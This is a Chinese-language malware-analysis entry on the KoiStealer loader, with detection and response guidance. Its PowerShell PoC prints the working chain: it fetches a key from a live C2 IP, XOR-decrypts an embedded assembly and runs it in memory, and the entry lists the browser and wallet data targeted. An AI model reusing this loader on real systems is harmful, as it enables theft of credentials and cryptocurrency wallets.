---
id: code-analysis-reverse-windows-koistealer-machineguid-config-xor-assembly-load
title: KoiStealer 最终 .NET 载荷获取：MachineGuid 请求 index.php 配置 + 管道字段 key + 字节数组 XOR + Assembly.Load/EntryPoint.Invoke
type: scenario
domain: code-analysis
path: code-analysis/reverse/windows
technique: machineguid-config-key-xor-assembly-load
aliases:
- KoiStealer 最终载荷
- MachineGuid index.php 配置
- 管道分隔 key|subid|URL
- 字节数组异或 Assembly.Load
- EntryPoint.Invoke 传配置
- Obfuscar 1.0
- KoiStealer 浏览器钱包窃取
tags:
- windows
- dotnet
- malware-analysis
- koistealer
- machiguid
- config
- xor
- assembly-load
- obfuscar
- browser-stealer
- wallet
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-08'
updated: '2026-11-08'
verification:
  verified_by: verifier-V308
  verified_at: '2026-11-08T11:55:16+08:00'
  notes: 已对照原文与截图核对 MachineGuid→index.php 配置、管道字段 key、-bxor 循环、Assembly.Load/EntryPoint.Invoke；修正字符串数组计数为 251(0xFB)；未复跑样本。
---

## 一句话结论

KoiStealer 的 PowerShell 阶段（`sd2.ps1`/`sd4.ps1`）读取 `HKLM\SOFTWARE\Microsoft\Cryptography\MachineGuid`，向 `http://176.10.111.71/index.php?id=$guid&subid=MchVLbQJ` 请求配置；响应按 `|` 拆成 `key|subid|URL`，再用 key 对脚本内嵌的字节数组做循环异或（`binary[i] ^= key[i % keylen]`），最后 `[Reflection.Assembly]::Load($binary)` 在内存加载 .NET 载荷并 `EntryPoint.Invoke(null, config[1..3])` 传入配置；该载荷为 Obfuscar(1.0) 混淆的 KoiStealer，目标是浏览器配置与钱包扩展。

## 原理

- **MachineGuid 作为受害者标识**：`(Get-ItemProperty -Path HKLM:\SOFTWARE\Microsoft\Cryptography).MachineGuid` 是 Windows 安装时生成的唯一 GUID；样本把它拼进 `id=` 参数，服务器据此返回按机器定制的配置，也便于攻击者区分肉鸡。
- **配置获取与格式**：PowerShell 设置 `ServicePointManager.SecurityProtocol += 'tls12'`，用 `(new-object net.webclient).downloadstring("http://176.10.111.71/index.php?id=$guid&subid=MchVLbQJ")` 拉取；响应示例为 `3wW5FfEGkmHuUGs0f5gQ|MchVLbQJ|http://176.10.111.71/index.php|`，`Split('|')` 后 `$k = $config[0]`（key）、`$config[1]`（subid）、`$config[2]`（URL）、`$config[3]`（空/备用）。
- **内嵌密文**：`.NET` 载荷的 `Main(string[] args)` 中硬编码一个 `byte[]` 数组（dnSpy 可见约 140 字节的 `0x20, 0x3D, 0x06, 0xFF, ...`），这是加密后的程序集；PowerShell 从 `args` 传入的 key 对它逐字节异或：`for ($i=0; $i -lt $binary.Length; ++$i) { $binary[$i] = $binary[$i] -bxor $k[$i % $k.Length] }`。
- **内存加载与入口调用**：`$sm = [System.Reflection.Assembly]::Load($binary)` 把解密后的程序集加载到当前 PowerShell 进程；`$ep = $sm.EntryPoint`，`$ep.Invoke($null, (,[string[]]($config[1], $config[2], $config[3])))` 调用入口并传入配置数组。整个过程不落盘（除脚本本身），Assembly 只在内存中。
- **最终载荷特征**：DIE 显示 PE32、.NET v4.0.30319、Obfuscar(1.0) 保护器、Console；dnSpy 中可看到 251 条（0xFB）字符串数组，含 MetaMask、Ronin、TronLink、Keplr、Phantom、Sollet、Temple、Coin98、Auro、Math Wallet 等钱包/扩展名，以及浏览器路径数组：`Mozilla\Firefox\Profiles`、`Google\Chrome\User Data`、`Microsoft\Edge\User Data`、`BraveSoftware\Brave-Browser\User Data`、`Opera Software`，并出现 `{d634138d-c276-4fc8-924b-40a0ea21d284}\1|Password` 这类 Chromium 登录数据字段。
- **为什么这样设计**：配置由服务端按 MachineGuid 动态下发，key 与密文分离（key 在 HTTP 响应、密文在脚本），静态分析只拿到加密数组无法直接还原；内存 `Assembly.Load` 避免 PE 落盘；Obfuscar 增加 dnSpy 阅读难度。

## 触发条件

- 受害者已执行前置 LNK/JScript/PowerShell 阶段，能够运行 `sd2.ps1`/`sd4.ps1`。
- 主机可访问 `http://176.10.111.71/index.php`，且 PowerShell 允许 `Net.WebClient`/`Assembly.Load`（未被 Constrained Language Mode/AMSI 拦截）。
- MachineGuid 可读（普通用户可读 HKLM 该键）。
- 服务端返回合法配置（key、subid、URL）；key 与脚本内嵌密文匹配。
- 最终载荷依赖的 .NET Framework 4.x 可用（脚本会根据 `%SYSTEMROOT%\Microsoft.NET\Framework\v4.0.30319\csc.exe` 是否存在选择 sd4.ps1/sd2.ps1）。

## 利用步骤

（按样本行为描述，非本机复现。）

1. 前置阶段下载并执行 `sd4.ps1`（存在 csc.exe）或 `sd2.ps1`；脚本设置 TLS1.2。
2. 读取 `HKLM\SOFTWARE\Microsoft\Cryptography\MachineGuid`，拼 URL `index.php?id=<guid>&subid=MchVLbQJ`，用 WebClient 下载配置。
3. 按 `|` 拆分响应，取 `config[0]` 作为 XOR key，`config[1..3]` 作为后续入口参数。
4. 取脚本内嵌的加密 byte[]，用 `key[i % keylen]` 循环异或还原 .NET 程序集。
5. `[Reflection.Assembly]::Load($binary)` 加载，`EntryPoint.Invoke(null, [string[]](config[1],config[2],config[3]))` 执行。
6. 在 dnSpy 中 dump 内存程序集或对 `Assembly.Load` 下断，导出解密后的 KoiStealer；分析其浏览器路径/钱包扩展字符串与配置字段。

## PoC

```powershell
# 原文 PowerShell 逻辑（去敏）
[Net.ServicePointManager]::SecurityProtocol += 'tls12'
$guid = (Get-ItemProperty -Path HKLM:\SOFTWARE\Microsoft\Cryptography).MachineGuid
$config = (new-object net.webclient).downloadstring(
    "http://176.10.111.71/index.php?id=$guid&subid=MchVLbQJ").Split('|')
$k = $config[0]

# $binary 为脚本内嵌的加密 byte[]
for ($i = 0; $i -lt $binary.Length; ++$i) {
    $binary[$i] = $binary[$i] -bxor $k[$i % $k.Length]
}

$sm = [System.Reflection.Assembly]::Load($binary)
$ep = $sm.EntryPoint
$ep.Invoke($null, (,[string[]]($config[1], $config[2], $config[3])))
```

```text
C2 响应示例：
3wW5FfEGkmHuUGs0f5gQ|MchVLbQJ|http://176.10.111.71/index.php|
→ key=3wW5FfEGkmHuUGs0f5gQ, subid=MchVLbQJ, URL=http://176.10.111.71/index.php

最终载荷：
PE32 / .NET v4.0.30319 / Obfuscar(1.0) / Console
目标：Firefox/Chrome/Edge/Brave/Opera 配置 + MetaMask/Ronin/TronLink/Keplr/Phantom 等钱包扩展
```

## 变体与关联

- 变体：配置接口可换成任意 PHP/ASP 端点，字段分隔符可换成 `;`/`,`/JSON；key 可改为固定值或从响应头/第二请求获取。
- 变体：XOR 可换成 RC4/AES/Base64；`Assembly.Load` 可换成 `Assembly.Load(byte[])` + `CreateInstance`、反射调用指定方法，或 `InstallUtil`/`RegAsm` 类 LOLBin。
- 变体：最终载荷可用 Obfuscar/ConfuserEx/.NET Reactor 等保护；字符串数组可加密/拆分。
- 关联：`[[code-analysis-reverse-windows-machineguid-md5-aes-cfb-payload-binding]]`（同样用 MachineGuid 做机器绑定，但算法为 MD5/AES-CFB，用途不同）、`[[code-analysis-reverse-obfuscation-obfuscar-dnlib-string-auto-decrypt]]`（Obfuscar 字符串自动还原）、`[[pentest-initial-access-koistealer-lnk-schtasks-jscript-downloader-chain]]`（本载荷的前置投递链）、`[[pentest-c2-dotnet-resource-dual-rcdata-xor-manual-pe-map-loader]]`（更早阶段的资源加载器）。
- 边界：文章只给出 PowerShell 代码与 dnSpy 截图，未完整反编译最终 KoiStealer 的窃密逻辑；配置响应示例来自一次请求，服务端可能按 subid/版本返回不同格式；未在本机复跑。

## 检测与防御

- 检测：PowerShell 读取 `HKLM\SOFTWARE\Microsoft\Cryptography\MachineGuid` 后立即访问外域 `index.php?id=<GUID>`；脚本内出现大段 `byte[]` 与 `-bxor` 循环；`[Reflection.Assembly]::Load` + `EntryPoint.Invoke` 组合；HTTP 响应为 `key|subid|URL` 形式。
- 行为：监控 PowerShell 进程中的 `Assembly.Load`、`EntryPoint.Invoke` 与 WebClient 下载；对非管理脚本读取 MachineGuid 并外联的行为告警。
- 加固：启用 PowerShell 脚本块日志/AMSI/Constrained Language Mode；限制 `Assembly.Load` 与反射调用；网络侧阻断 C2 `176.10.111.71` 与 `schermarieti.it` 可疑路径。
- 响应：内存 dump PowerShell 进程，提取解密后的 .NET 程序集；轮换被窃取的浏览器/钱包凭据，检查钱包扩展与浏览器配置目录的异常访问。
